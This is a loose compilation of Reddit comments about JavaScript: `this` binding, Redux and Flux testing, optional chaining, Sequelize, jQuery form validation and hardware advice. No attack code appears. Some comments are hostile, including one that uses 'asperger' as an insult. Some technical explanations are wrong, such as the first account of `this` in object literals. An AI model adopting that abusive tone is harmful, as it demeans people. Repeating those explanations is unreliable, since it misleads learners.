Alright, thanks :) I'll look a bit more into it and double-check how often I change single values vs how often I need the whole thing. Or I'll just go with rejson, but I gotta ready more about that, too :) It was introduced on a redis con, so I assume it's legit and does solid work. I've found benchmarks with a quick google, and the performance seems good, too (and you can access single values).
It might help to show us some sample code from a couple of components so we can give feedback on how that component can be tested or how it can be made more testable.
Yeah. Javascript is insane (when you don't know it). And js code is not testable (when you are too cool to read jest manual). Why are you wasting your life for it, then?
On a Note 8 and same result. Some of them kind of work with the S Pen, but it's not ideal.
Your GPU shouldn't have any effect on Javascript development tools. 
everything in js is an object. `this` references the object or function or anything in between that you're currently inside of (aka scope). so `var x` in the current scope is the same as `this.x` (eg `x == this.x). inside an object where `x` is defined in the scope of the "parent" `x != this.x` for example ``` var x = 1; var obj = { a: this.x } b = this.x; ``` a is `undefined`, but b is not. https://i.imgur.com/fC9tzLQ.png `a` is undefined because `this.x` is a reference to `obj.x`, which has exactly the error you would expect when you haven't defined `obj.x`
Yeah. But it would I imagine when painting the window and working w dev tools
I mean, maaaaybe if your browser is set to fullscreen on a 4k monitor and your app is crammed full of widgets and effects or something.
`this` is the object to the left of the dot during method call. Except when it's not. There are four scenarios to keep in mind, but remember that sentence and you'll mostly be fine. `this` isn't magical, it's really just another argument, just not one in between the parentheses. It has a weird default value, and it gets reassigned sometimes, but it's heart it's just the object to the left of the dot. Four possible values for `this`: ------ _1) The object calling a method (i.e. to the left of the dot)_ const obj = { hello: function() { console.log(`Hello ${this}`) } }; obj.hello(); // Hello [object Object] This is what `this` is really intended for. It's just an extra parameter, one that corresponds to the object calling the method. If you've used Python, they call it `self` and it is explicitly passed with other parameters (`def hello(self):`), but it's the same idea. ------ _2) The global/window object_ const hello = function() { console.log(`Hello ${this}`) }; hello(); // Hello [object Window] So what if there is no object to the left of the dot? You might expect `this` to be `undefined`, like other unset parameters. No such luck. Instead it becomes the global object, the `window` in the browser. As far as I'm concerned this is garbage behavior, and if you actually see it happen, it's probably a bug. For example, if we reassigned our hello function from earlier: const badHello = obj.hello; badHello(); // Hello [object Window] // Nothing to the left of the dot, `this` === `window` ------ _3) `new`ly created objects_ const Greeter = function() { // var this = {}; this.greeting = 'hello'; // return this; }; const greeter = new Greeter(); console.log(greeter.greeting); // hello This is the classic way of building a constructor in JS, and unfortunately it creates a lot of confusion. There is clearly some magic happening, but it's not immediately clear what. Really it's pretty simple though. The `new` keyword essentially adds two lines of code to your function, one at the beginning which reassigns `this` to an empty object, and one at the end which returns `this`. That's why if tried to make a Greeter without `new`, you would see this behavior: const badGreeter = Greeter(); console.log(window.greeting); // hello (`this` never reassigned, so it equals the global object) console.log(badGreeter); // undefined (no return statement!) ------ _4) Explicitly reassigned with `call`, `apply`, or `bind`_ hello.call(obj); // Hello [object Object] Last exception. I'm not going to go super in-depth into this one. You can [look these functions up on MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/call). They are there for you to explicitly assign `this` if you need to, and that is exactly what they do. Using them, `this` can be anything you want. This is particularly useful when using something like `setTimeout`: setTimeout(obj.hello, 1000); // Hello [object Window] setTimeout(obj.hello.bind(obj), 1000); // Hello [object Object]
So a lot of it comes down to the fact that I wrote components quickly and without regard to testability. Breaking this apart I'm finding is very very difficult. I've got flux actions, modal (on/off) stuff, all over the place.
You don't need a fancy GPU.
OK, well what would improve it?
Yeah this is what I am doing today. I pretty much understand it needs to happen. Breaking it apart (basically changing it) without any tests is hard because I don't know if my refactor is going to break stuff in production. But the problem is if I don't refactor it I can't ever test it to have decent regression. Thanks for just letting me rant.
Minimum 16GB of RAM, recent gen quad-core CPU, and an SSD.
What goes on the ssd? Or is that the primary hard drive?
Yeah, it would be your main system drive. Run your local dev environment off of it, your programs, etc.
Found this thread while googling a question while working with BlueprintJS - it's trivial to get blueprint working and looking good on mobile if you use it with https://github.com/JSxMachina/react-grid-system to manage responsiveness. The conditional rendering was a bit annoying in the beginning but I've ended up appreciating the level of control it gives me to be very deliberate in rendering for mobile views.
Learn to touch type.
240gb ssd Os + devenv + Code repo Everything else put it on a HDD. For cold storage. You could consider putting linting on a separate command to so you don’t do that on every comit. 16gb ram I would say. Consider separating concerns if possible and if allowed raw html over transpired code for what you can. 
Would this work with just an image embedded in the SVG ( yeah, I know, I should try it myself but I'm time impoverished right now ;) ) ? 
i7 with the most RAM, and the largest SSD you can afford.
Like...you realize that not all backends are under your control? And choosing to restrict traffic to the same origin is completely the API owners' right and decision to make? Not to mention that your "solution" is dumb as hell because how the hell is OP going to tell all their users to go start their browsers with security checks disabled before they can visit their site when it's hosted in production?
ssd. that's all. &gt; it basically needs to be a mac no it doesn't. don't be silly.
One thing I am trying to figure out is how to test a component that when mounted calls out to an API using flux's actions. The store then receives the API data and transforms it into new objects. I want to test that the code to transform the API response json gets deserialized properly into objects in memory. What's the best way to this this using React/Jest?
This is fantastic. Thanks.
Maybe 10 years ago, but class syntax and fat arrow functions make `this` fairly straightforward. You might need the odd `bind` or `call` but I don't think it's nearly as big an issue as being presented.
I’m not sure if this has been mentioned but you probably shouldn’t jump from really simple js and jquery to react. React has a lot of buzz around it but if you don’t understand some basic js concepts, you won’t really understand React or its principles. JavaScript.info is an amazing website. And it explains things very well. You should be very comfortable with objects. Classes. Prototypes. If you are able to create a small component architecture yourself using classes then you will do fine in React. 
People actually buy fonts? There are so many free ones!
People shouldn't use classes either. JavaScript uses prototypal inheritance and classes are just going to confuse people when they try debugging their code and see `_proto_` and `prototype` everywhere. It is just for devs who can't think outside of the OOP mindset. Arrow functions also can't be used everywhere. Vue, for example, won't work if you use arrow functions in certain areas.
This is a sample page with the html code: https://justanotherrecipeblog.tumblr.com/post/171039399119/creamy-kale-and-turkey-sausage-pasta-with-sun
A hashlink (or anything similar in a URL) might or might not be too short for all the data you want to encode in it, depending on how complicated the characters are and how many possible character permutations there are - you really want hash links to be as short as possible for the user's benefit. Do you have some idea on the number of possible combinations?
I think I'll have to track ~3600 various flags... which is a base64 string about 600 characters long... which is why i reaaaaaly dont want to do that unless its the only way.
Check this again, I showed you how to do this already: https://www.reddit.com/r/javascript/comments/7x3654/fetch_data_from_unstructured_data/du5ebr3/
Why are you using rollup and webpack at the same time - they do the same thing? This sounds like the source of your performance issues not the machine.
3600 flags, are those true or false only, or do can they have numeric/string values too? If not, ASCII characters can only store ~7 bits of information, and 514 characters is way too long for a user-friendly URL. Who should be able to view characters? Only the creator, or do you want other users to be able to (somehow) load characters made by others too? If it's OK for the characters to only be viewable on the browser they were created on, then you should probably use Local Storage. Are you sure nothing will be stored on the server - the server only parses an input, but doesn't save it? If the server doesn't save it, there's probably no good way for users to transfer character information between themselves (or between browsers) unless you want them copy-pasting large amounts of junk.
All the devs I met you use classes in js don't use debugging tools.
You can define static methods, but they're not on the prototype, they're on the class itself. class Person { constructor(){}; static sayHi() { console.log("Hi"); } } Person.sayHi(); // Hi https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes/static
For one, you'd type just `sayHi() {`, not `function sayHi() {` to avoid the syntax error. https://stackoverflow.com/questions/48012663/how-to-define-a-static-property-in-the-es6-classes You can't define standalone functions/variables in the class block (yet - this may change soon), you'll have to use the outer scope instead.
Thanks for responding. I had a rough week when I wrote this initial question and so I am still digesting your thoughtful response. I hope to respond once I have some time to think more about this. I will say, though, that I don't have much experience and that I'm without much guidance, so your advice regarding learning stuff alongside strong senior developers does not apply. But I do have some resources to look at, and I thank you for providing those.
But your component code is coupled to the selectors - in the example you have given with resources, if the way the resources store changes then you have to update the ui component, which seems to be what you are trying to get away from. Its ok to read straight from state in your ui components where the state is simple. If you want to share mapping logic between components that are reading from global state then its ok to use selectors. Whatever you need to do to keep your project simple and maintainable.
* With `/u`, a dot matches Unicode code points. * Without it, a dot matches UTF-16 code units. You can see that in the following interaction: &gt; /^a(.)/.exec('a\u{1D306}')[1].length 1 &gt; /^a(.)/u.exec('a\u{1D306}')[1].length 2 &gt; /^a(.)/u.exec('a\u{1D306}')[1] === '\u{1D306}' true Similar: * `[...str]` produces an array of code points. * `str.split('')` produces an array of code units. More info: http://exploringjs.com/es6/ch_regexp.html#sec_regexp-flag-u
Hmm so you want the users to deactivate JavaScript ? Alright, but can't you see we are in 2018 and that there's a lot of SPAs ? So you're basically saying : "Let's go back to plain old server-side rendering only with only post actions like ASP.NET !" to a subreddit that is pro-javascript ?!
'this' is nice!
dual monitors
Google static properties in JavaScript
That's really interesting. So in the example they showed in the article `/a.b/.test('a\u{1D306}b')`, that failed because `\u{1D306}` is actually 2 characters/code units. When the regex is `/a..b/`, it returns true. 
lol
Ha brilliant. Although I'm mostly doing CSS modules and CSS in JS these days, this is a good technique. You could theoretically use any CSS property to store data like this though, no?
You’ll probably want to save their data in a database, and generate a unique Id (an 8 byte random string works surprisingly well for applications not at Google scale) for users to save on their end. That way you get short ids for your users and you don’t tie the data structure/values to the id. 
I don't this will work.
Absolutely! You could really go crazy with this idea since you really aren't using CSS for the display, but to store data. I'm gonna tinker with CSS modules next and see if I can solve the same type problem but with a more standard solution. Either way, science. Science is fun. 
You can do static methods, or properties in the constructor, but not static properties.
I highly, highly recommend against implicitly creating global variables. You might consider using a linter. Don't mix `const` and `var`: use `const` everywhere possible, when you have to reassign (which you should try to avoid), use `let`. It sounds like your application needs to store a state of previous colors selected - try using an array of 3 elements. &gt;I would appreciate if you choose jQuery, jS would still work. It's *your* homework...
ok
Thank You for Your Suggestions.. Yes it's my homework and I am just getting started with ES6 so I mixed up var and const, I will correct that. I plan to use array and then push selected color to array.. Until it's length it 3. and use a loop to apply background color to Divs that would represent recent Colors. Am I on right track? 
You can do something similar with a getter, tho I don’t find it particularly satisfying myself: class SomeClass { get staticProperty() { return SomeConstant; } } 
Even though a back-end is highly preferable, he could use local storage for the game data and accounts. 
Organizing data structures with functions that operate on them does not an object make. 
Very interesting article, the author clearly knows his stuff. I read a few of his other posts as well, very insightful!
So glad to see this. I adopted the c# equivalent so fast when it came out. Plus we use Babel in our workflow where I work so I guess I can use this right now!
Can't see anything on Chrome on Android at all either...
I'm confused with what you're doing can you explain this in more detail? 
I did the same thing to share breakpoints across environments. Works great. 
&gt; nted to assert that the data is array of interfaces DBInstance. I wanted to reuse DBInstance definition instead of repeating all over it in my test case. Are you testing API response of your own api or someone else ? You should not be testing if the API is returning correct data. You use Pacts for that. 
I would expect two sets of tests here. The first would be around the component - that it calls a function from its props when it is mounted. The second set would be for the store and it's handling of API responses. I would mock fetch with my API response, then stand up my entire flux store. I would send actions, and assert that the store contained the data once the action was done.
That's what this guy proposes: https://github.com/erikras/ducks-modular-redux. I quite enjoy this pattern. I like to think of redux as a more powerful immutable object that you can trace the history of through actions. Objects will quietly mutate without a good way to debug the many mutations it goes through (especially async ones). Here's a horrible analogy: Watching a magic trick dissected in slow motion with replay ability (redux) like remember this guy: https://youtu.be/JT4YFHB-mvc? vs. watching it real time with no replay (plain o' objects) like going to watch David Copperfield in Vegas right now. Otherwise, yes, it's just an object.
Video linked by /u/shizzleberry: Title|Channel|Published|Duration|Likes|Total Views :----------:|:----------:|:----------:|:----------:|:----------:|:----------: [Magic's Biggest Secrets Finally Revealed S01E01](https://youtu.be/JT4YFHB-mvc?)|haikich1118|2012-03-23|0:43:02|21,681+ (92%)|6,490,201 --- [^Info](https://np.reddit.com/r/youtubot/wiki/index) ^| [^/u/shizzleberry ^can ^delete](https://np.reddit.com/message/compose/?to=_youtubot_&amp;subject=delete\%20comment&amp;message=$comment_id\%0A\%0AReason\%3A\%20\%2A\%2Aplease+help+us+improve\%2A\%2A) ^| ^v2.0.0
What if we had a global singleton object with methods to get and set its state, where the mutators never mutate the internal state but make a copy (like reducers), and that optionally (during development) logged every call to its mutators with its arguments and a reference to the new and old state at that time? That would also give replayability. I mean Redux works (until you get into trouble with combining React-Router and Redux, etc) and it's made a lot of our apps a lot cleaner, but I'm not alone in feeling there must be an easier way to achieve what it does.
I need this in my life today. I'd say undefined is the biggest annoyance and probably the only major one remaining I have with Javascript. Currently using lodash get for this purpose. 
Happy to see this. JavaScript is becoming better and better. I used to make fun of it ten years ago, but it's improved more than any other language I know. Also what is great is that even if you don't like JavaScript, you can use another language that simply compiles into it, and you get to benefit from the platform and its tooling.
Answering myself: it'd be slower than reducers. Making a deep copy each time is slow, and it wouldn't be possible to check if some subtree is unchanged just by reference. So it comes down to: Redux is a speed optimization :-)
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [ReactTraining/react-router/.../**react-router-redux** (master → ecc9a73)](https://github.com/ReactTraining/react-router/tree/ecc9a73230f574cba138929cd8ef829592609006/packages/react-router-redux) ---- [^delete](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply duj97dl.)
This is cool! 
aka [Safe navigation operator](https://en.wikipedia.org/wiki/Safe_navigation_operator)
Of course you don't but if you want to, that's how you do it. 
Yh. I made the the jsfiddle code a function and tried to use return to get the value but it didn't work. I'm not that good in js.
existential chaining like coffee? :D hey?.thats?.pretty?.good
&gt; Plus we use Babel in our workflow where I work so I guess I can use this right now! But if syntax changes or it even never makes it to the standard as well, you will have to update your codebase.
It wouldn't be a clone of Redux since the whole action/reducer stuff would be unnecessary. It really is a huge amount of boilerplate and I'm sure that in two years everybody will have switched to something new that doesn't require writing them. I run into a bug where components that use both connect() for the Redux store and also need to access the router with withRouter() (just to use history.push) don't always render. Haven't exactly worked out what I'm running into yet, but it's related to https://github.com/ReactTraining/react-router/issues/4671 .
thank you very very much! But unfortunatly I don't quite know how to implement this into my project because I can't use the [code]&lt;a href.....&gt;MyPage1&lt;/a&gt; command[/code]. Here is how I have it now: [code] app.tremoloON = function() { testarray[1] = 13; app.device &amp;&amp; app.device.writeDataArray(testarray); window.location.href = "MyPage1.html"; }; [/code] This is the function where I want the page change to happen. Sadly I don't know how to combine the data-page-link command and the link class with the window.location.href command. And here is the html that calls the function: [code] &lt;button type="button" class="green" onclick="app.tremoloON()"&gt; Tremolo ON &lt;/button&gt; [/code] And one last thing: What do you mean by I have to have a container with the pageContent? I'm afraid I miss the most basic understanding of Javascript to know what container means.
TIL that my phone has force-touch support. I never knew. Neat!
Small price to pay. In-fact you could probably codemod it out if needs be.
If such a codemod is available/you're able/willing to write it yourself. In any case, it's a good thing to be aware of before blindly adopting it - I'm afraid many people aren't afraid what "stage 1" means.
Cool! For anyone wanting to use this today and is already using lodash or underscore, use the _.get method `_.get(object, 'path.to.deeply.nested.freakin.item', optionallyDefaultValue)` https://lodash.com/docs#get
Also known as Consumer Driven Contracts https://martinfowler.com/articles/consumerDrivenContracts.html https://docs.pact.io/
aaka The Elvis operator
I want this. Only thin off-putting is that it's in proposal stage-1 since so long.
Easy fix: never upgrade your babel
Very nice
Have you looked at using algebraic data types, like Sanctuary.js?
I really hope this doesn’t come to js. It’s so awkward to debug in c#. Just imo
Have the authors of the proposal explained why a dot is always needed? Seems a little unnatural for bracket notation and function invokation. I would have thought that a JavaScript engine would be capable of handling each context appropriately with just the question mark symbol.
Your slashes are confusing 
No.
Thanks for that. I will look into it.
&gt; the internet is the biggest threat to the security In a way it is, however the JS implementation in user agents is so arcane, that most of the attack surface in browsers can only be reached from JS code. Many attacks (including the branded SSL/TLS vulnerabilities) require the attacker to be able to run JS in the browser of the victim. So yes, JS actually **is** (at least one of the) biggest threat(s) to the security of users.
It also makes sense to distinguish because it doesn't call the function, only check if it exists (AFAIK)
It *first* checks that it exists, and if it does, calls it.
yes
Hehe :)
What would you suggest as an alternative? Do you think what we have now is fine?
Why delete this post? I’d like to read what others contribute.
Recently I wanted to introduce this to our commercial project but I faced the opposition because this feature is only in stage 1 and it's not clear if or when it's coming to be a part of a standard. 
Clear code &gt; cleaver code. Future you or other devs will thank you.
How would it be hard to debug, you can. Always see the object in the debugger at they line and the result of the expression.
Really want this my code is littered with these. I also want a way to bind methods of JS classes with their own this. I have so many of these in my constructors: this.myfunc = this.myfunc.bind(this)
That's because your use\-case is too specific for a tutorial specifically for that. But generally, you need to think about if you want to use firebase for that, as it sounds like you've got what we call relational data. If you decide however to use firebase, you're going to be having a structure with 2 main objects: Schools and Students. Schools might have a relationship to students by having an array with all the student IDs in it, and vice versa, the students have a school ID connected to them. Check out tutorials about firebase in general and structuring your data. Have fun!
In every language except C# you are correct, the safe navigation operator is referred to as the Elvis operator in C#. I don't know why, but it's weird that way.
Should also mention that this sits below this: &lt;script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"&gt;&lt;/script&gt; And before the &lt;/head&gt; tag, the code is also encased in a &lt;script&gt; tag.
You can use Ramda instead which lets you curry it. const myPath = R.pathOr(optionallyDefaultValue, ['path', 'to', 0, 1, 'deeply', 'nested', 'freakin', 'item'); const getItem = myPath(object); // &lt;value of item&gt; || optionallyDefaultValue
I think you need to spend some more time learning the debugger in Visual Studio. This is not at all true. You can literally hover over each piece of the expression and a tooltip tells you what it evaluates to. Not only that, but you can use the immediate window to evaluate your own expressions in the same scope, as well as look at the object in the autos. There are about half a dozen ways to see the value while debugging.
The ideology of the app development with using JS has changed. Now all the structures have become more unified and more comprehensive. When designing with jQuery, a simple change in the name of the class in the layout will, in the best case, turn off the associated functionality, at worst, the application will fall completely. When working with the API and modifying the data on the page there are a number of inconveniences. For example, jQuery should generate the same markup as the backend, so you need to handle two independent, but identical methods for rendering markup. In this sense, the latest frontend tools are designed for consistency and not duplicating code, but its over-utilization.
&gt; No one, developers or users, want to return to a web without JavaScript that makes it sound like there is no alternatives. but there are. native applications that are more secure, less privacy invasive, less resource hungry and much quicker. Also this statement conflates interests and perspectives. There is actually at least 3 different perspectives here, the dev, the business and the user perspective. i understand that for some devs and some businesses it is a true what you write, but users if they'd have a choice i'm not sure they'd choose the js variant when there is a competitive native offering. and if i understand this correctly warning.js is targetted at the interests of users, not devs, not businesses.
It looks like its your each loop that you're tripping up on. If you each `$("form")`, you'd be looping through all of the `&lt;form&gt;` tag elements. But it looks like you want to loop over each of the `$(".field")` elements. So change "form" to ".field" and in the loop change `$(".field")` to `$(this)` which will represent the current field in the loop. 
That doesn't appear to have fixed it. I'm still getting a disabled &lt;input&gt; button even if the fields contain text
I would prefer it to stay ?. because that particular convention has already been adopted by other languages, thus it would be more familiar. 
As a community, we just need to use this responsibily. Nothing worse than eating what should have been an error early and allowing the application flow to continue, causing downstream errors and making the real error location harder to track down. 
r/LearnJavascript r/jquery
You can do it now. https://babeljs.io/docs/plugins/transform-class-properties/
This is a great explanation. Clarified some things for me. Thanks for writing this up. 
I looked for this a lot and it seems currently the best way is to use lodash _.get function, here's an example if anyone's interested: _.get(parentObject, 'nested.path', optionalDefault) But nice to see it as native operator. I like to call it 'soft dot' myself
Rather than disabling the send button, you should prevent the default behaviour of `form.on('submit', ...)`. It would look like this (warning, this is pseudo code, not tested): $('#The_Form').on('submit', function(e) { $('.field').each(function(field) { if (!field.val().length) { e.preventDefault(); // Cancel submit } }); });
This looks really cool. In your benchmarks, `filter()` was left out. Do you have any stats comparing your library with the built-in `Array.filter()`?
I'm still experiencing the error... have I missed something? $('form').on('input change', function() { var empty = false; $(".field").each(function() { if ($(this).val().length === 0) { empty = true; } }); $("#send").prop('disabled', empty); });
No I write c# all day and know each of the techniques you’ve listed. It’s not that debugging it is particularly difficult, I just don’t appreciate the uncertainty it brings with it. There’s nothing wrong with a differing opinion and I respect yours
You didn't change the loop
What error?
I didn’t say hard I said awkward. It’s like nullable bools, they have value but also a trade off in clarity.
I don't mind this coming to JS since different tools for different jobs and all that, but it's been my experience that if you have to do this extensively, you have some design problems with your code whereby objects may or may not be in a reliably complete state at a given time. It means you either have the wrong abstractions, the wrong data models, are grotesquely violating the Law of Demeter, or are assembling data models at the wrong points in your codebase. Your goal should be to design your domain and application such that you are always working with proper, well formed objects that do in fact have the data and properties you expect them to have. If you only need partial data from a model and don't want to have to populate the whole thing, then your data model is too tightly coupled and you should break it apart. If a function is asking such a deep chain of data, then stop passing in the root and pass in only the leaf that you need. As convenient as `foo?.bar?.baz?.()` is, it's really hiding a code smell. At least before when you did all that explicit null checking, you had to stop and think if that was *really* the right design for the code, and that maybe something was amiss. 
stfu
i think that opinion is fair, I'm not sure that what we currently have is good enough either though.
infact, as it's for a company, on a per unit-of-currency-for-your-country, a mac represents terrible value for money. buying one or two SSD's of 500GB will more than suffice.
in which case you know how to save money by now wasting it on over-priced electronics such as macs. you seem to be a chess aficionado and i believe that's called czech-mate
The volume is very low.
Sequelize has a special mechanism for loading custom models in other files. The reasoning behind it being that they try to initialize the database connections and typically they also try to handle things like migrations and synchronization of your models. But anyways, [here’s where they explain the import mechanism](http://docs.sequelizejs.com/manual/tutorial/models-definition.html#import). In your server file, you need to call the import function from sequelize and it will initialize the models for you. Then I would add them to your app instance so you can access the models from your routes or your controllers. Or better yet, I would define the models in their own folder, and in an index.js file, at initialization time call the import function, then store the initialized sequelize models in an object. Now every time you try to import the models from somewhere else, return the freshly initialized models from the object and you won’t have to call import again.
&gt; Is it something like that you had in mind? Or did I misunderstand you? Your understanding is correct. I look forward to seeing the results.
The &lt;input&gt; send button is still disabled even though the fields have text within them.
You see in export default (sequelize, ... That's exporting a function that takes a sequelize instance and the Sequelize module (ie DataTypes) as parameters. What you need to do is: import makeAttachmentsModel from '../../../models/attachments; /* your other imports */ import Sequelize from 'sequelize'; const sequelize = new Sequelize(); const attachments = makeAttachmentsModel(sequelize, Sequelize);
Ideally you would have another module that does all this instantiation of sequelize and models, you probably need to sync the database or use migrations as well.
In feel stupid but the documentation doesn't seem to spell this out. Unless I'm blind. 
Thank you. 
If you want to do this on the frontend, there are actually a bunch of tutorials for React, Vue, Angular, jQuery even (I would recommend Vue, it's easier bootstrap and get the basics of than the other two) that will integrate with Firebase. You'll probably want to fetch data depending on what's clicked and display it. On the backend, you'll want to look at something like Express with EJS, handlebars or pug. The gist of it will be: the browser navigates to `/school`, you fetch from Firebase and return a list, the buttons are actually just links that point to things like `/schools/students` and then `/schools/students/jake`. Depending on the route you return different lists etc.
So no error, just not working? Just tried it; works for me: https://codepen.io/anon/pen/RQMyqz
I know arrow functions do this but it's nice to write using class syntax when you are writing a class.
Yea but it should ebe handled without a plugin or library
Ah okay this actually helps a bunch, this means something else somewhere in my code is screwing this up...
you must be a joy to know. It was a joke you complete asperger. yeah, i expect every user to use terminal to launch a security disabled chrome...
I don't think they mean "difficult" as in difficult for the parser, but for the programmer of the parser. Perl 6 solved this by changing the conditional operator to ?? ::
Why does Elvis have only one eye in C#?
I guess I'm just not certain why you think it brings more uncertainty, the expression is either null, or the fully evaluated nested expression, there isn't an inbetween. In most cases I've found safe navigation brings both clarity and readability to what would otherwise be a very nested/chained Boolean expression (exactly what most people in js have to do). You stated it was awkward to debug, but then said it's not the debugging. I guess I tend to think that if someone new to c# or .net, or development in general would cone across your post, that is the response I would give. I would agree there a situations that people can go a little over the top with them and sometimes a single if statement adds more clarity, but I think that is then an incorrect use of the safe navigation. All said though, it is a small price to pay over the added security of knowing your application is less likely to throw null reference exceptions. Adding it to the js spec would further js robustness, "being liberal in what you accept and strict in what you do". It makes it easier and cleaner for developers to account for situations where objects are unset, even if they are supposed to be under normal conditions.
Fun fact, PHP 7 now introduces a `null coalescing` operator so you can do something like this ``` $var = sizeof($specimen-&gt;arms) ?? 0; ```
Sure! I have a case where I would like some of the variables in my SASS file exposed so that I can read that in my JS. Ex: ``` $themes: black, red, blue; $color-1: red; $color-2: blue; ._themes { content: "#{$themes}" } ``` And then in my JS I can look up the _themes rule and immediately know what themes I support. 
But that's stringly typed. Not even really fancy linters can help there
Easier than the canvas?
While this is a solution, I refuse to use it because of the difficulties it introduces when refactoring nested keys.
Definitely a valid point
&gt; Whether a native app vs a web app is better is a very different question than whether users would want to have JavaScript disabled. true. but you made it sound like there is no alternative to js apps, i just gave a counter-arguemnt to that. disabling js is a first step in the direction of requiring native apps (or other solutions). it sends a signal to devs/businesses that the demand side of the market rejects the offered solution. &gt; Further, I don’t think native apps are more secure or less privacy invasive. You can still collect and misuse information in a native app. yes, but native apps are much more compartmentalized and often vetted before offered in distros and stores. with most native apps it's not like you suddenly have an engine allowing to everyone execution of untrusted remote code downloaded from random online sites, as is the case for javascript. &gt; The topic here is whether disabling JavaScript is a good thing for users, developers, or businesses as far as i can see this warning.js is about users, not devs and not businesses. &gt; and given how much everyone uses the web and how infrequently anyone calls for disabling JavaScript despite the existence of native apps it would appear that the answer is no. the market is not a fair market, as the information available is dominated by the supply side (devs/businesses) and users are only using what they are offered, not what they would demand if they would be well informed, thus the lack/infrequency of calls for switching of js is not a good argument.
🙏 this will clean up so much code
Does it help if you don't create a new vector every time? It feels like a bad idea for the GC. 
The notes themselves are generated in Javascript by layering different harmonics of waves and the frequencies are changed according to the scale being displayed.
&gt; On the other hand experienced (competent) JavaScript developers are hard to find. Probably because CS programs teach JavaScript in a class or two maybe, using technology or standards from 15 years ago. Or that was the way it was at my university anyway, I understand that there are programs out there actually teaching things like Angular and React. But when I was applying for jobs I had no idea about the ocean of new concepts that existed between what I was taught and present day. 
Could be a good number of things: Having more than one provider, using pure, the order of wrapping connect and withRouter.... I never had any issues using this on production apps at two different startups 👍🏻
Thanks for your comment @thinksInCode . I will update my post again. I am only sharing my own experience of interview by my article and I never misguide my viewers. Well thank you so much for noticing me these type of errors in the post.
I prefer using destructuring and defaulting, which works today: const { arms: arms = [] } = specimen arms.length &gt; 2
Cool
Yes! It's one of the reasons I keep using Groovy.
No, the Elvis op is `?:`
This could be super use full will try it out in my next projekt. You should add js highlight in the readme file for clearer examples.
Yeah the documentation isn't the best and a lot of it is outdated since v4 of Sequelize dropped. You could actually write your model using an ES6 class: import { Model } from 'sequelize'; // Sequelize.Model class Attachments extends Model { static init(sequelize, DataTypes) { return super.init({ type: DataTypes.STRING, category: DataTypes.STRING, value: DataTypes.STRING }, { sequelize }); } static associate(models) { this.myAssociation = this.hasMany(models.otherModel); } } To sync, you need to call `.sync` on your sequelize instance: const sequelize = new Sequelize(); // This will aggressively update your database to the sequelize schema // without caring if there's any data in it. if (process.env.NODE_ENV !== 'production') { sequelize.sync({ force: true }); } 
I really really really want to use CSS Variables but I have to support IE9 :( :(
Makes it more readable (IMO), so easier to debug?
If your main priority is marketability, then definitely go for TypeScript - it has a larger community and more library definitions. I say this as someone who personally prefers Flow.
I just implemented it using this https://clipboardjs.com/ and it worked like a charm.
[Here](https://imgur.com/a/w7f0i) is the `filter` benchmarks. But, do note that the current `filter` implementation is not fully optimized. It's a [very simple](https://github.com/funkia/list/blob/master/src/index.ts#L795) implementation. In particular it uses the normal pure `append` that exposed to users. I'm guessing it can be made quite a bit faster by using an internal `append` that mutates. 
&gt; I know arrow functions do this but it's nice to write using class syntax when you are writing a class. Property initializers do this. 
Dart has this too
When you say JS do you mean NodeJS? In other words, is this meant to be a statically hosted client side application? If so, I'd suggest using Firebase or similar IAAS providers. If you are thinking of hosting a NodeJS server somewhere, the easiest approach is probably to just use express, and render templates filled with data from whatever database. NPM has good connectors for any database you'd want. However, if hosting NodeJS and SQL is an option, I don't see why you couldn't use Java.
You did a good job at trying though and I get exactly what you're saying. It's helpful. I think it's an interesting intersection, I've experience of both both sides (game development vs app development) and it feels like there should be an abstraction for app development that sits on top of a game engine. Perhaps not, I'm just riffing really, but the emergence of "reactive apps" suggests more game like responsiveness, streaming data and so on. 
Vanilla js.
I don't know if that's what I meant :) Like I mentioned, I am pretty out of it, so there are some basics that I will need to learn, such as how all the various tools work together, so I suppose NodeJS may be part of the answer? A lot of the names and acronyms you used were foreign to me (PAAS, Express, Firebase, NPM) so I had to look them all up. It would be static on the client side, as the users would only be viewing data. There would need to be the ability to upload new data from an admin page (i.e. the results of the races). I just took a quick look at Firebase and it looks interesting and worth investigating as a good option.
How much work is it to make a Stage 0 proposal for TC39? I'd really like to get some discussion on Dart-inspred [Cascade notation](https://www.dartlang.org/guides/language/language-tour#cascade-notation-) - A sort of "operator" (..) that works like "." expect that it returns the left hand side object - that would allow having jQuery-like, fluent APIs for basically every object (even existing, ancient APIs), without creating the overhead that a fluent API wrapper or even a whole library would, or forcing people to use `return this` in every method instead of returning something potentially useful. Basically, it's supposed to allow things like new XMLHttpRequest()..open('GET', '/test.json')..onload = () =&gt; console.log('Done!')..send(); or document.querySelector('#div') ..textContent = 'Hi!' ..addEventListener('click', () =&gt; console.log('hi!')) ..classList.add('very-important'); Do you need to already write parser rules and everything for a stage 0 strawman? Are proposals welcome at all?
That's possible. I assumed it was for performance reasons because they used the term 'efficiently'. Perhaps, as you suggest, they mean 'efficient to implement', meaning it's simple to implement.
Ok that's cool but can we have the operator be 👏? species 👏 arms 👏 length
Sure, there are drawback to this method, although I've been using it in a large project for quite some time now and frankly didn't find many practical issues so far. I'm not saying you're wrong obviously, but can you provide some actuals example of when this could cause issues?
Awesome name 👍
3kb of code for what amounts to "document.execCommand('copy')"???
Unfortunately, I'm not familiar with those other languages. I'd be curious to see their syntax in action if you could point me in their direction. Just to be clear though, the dot notation in itself is perfectly fine where it makes sense. In fact, it would be quite odd if it were missing in those contexts. However, the proposal is to use the dot notation in places where the `.` would throw an exception if the `?` were missing: for bracket notation and function invocations. For instance, the following code will throw an exception in your browser: var object = {a: 1}; object.['a'] = 2; // SyntaxError: Unexpected token [ It's in contexts like these that it would be nicer to omit the `.`. So: object?.property; // This is perfectly fine. object?.['property']; // This is a little strange and inconsistent. object?['property']; // This would make more sense and be consistent with the rest of the language.
I definitely agree with you on the brackets. If they can find a way around it for brackets, I’d be much happier with it.
Live a little
Thanks for the quick response! I'll be keeping an eye on this library and see what kind of perf impact it has in my current projects.
